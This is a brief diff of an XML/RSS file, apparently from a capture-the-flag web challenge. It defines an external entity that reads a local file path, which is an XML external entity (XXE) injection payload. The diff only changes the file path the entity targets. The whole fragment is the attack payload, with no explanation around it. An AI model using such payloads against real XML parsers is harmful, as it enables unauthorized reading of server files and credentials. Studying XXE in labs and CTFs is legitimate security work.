@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE psswd[
-  <!ENTITY psswd2 SYSTEM "file:///ssvgnfx"> 
+  <!ENTITY psswd2 SYSTEM "file:///challenge/web-server/xee/"> 
 ]>
 <rss version="2.0">
 
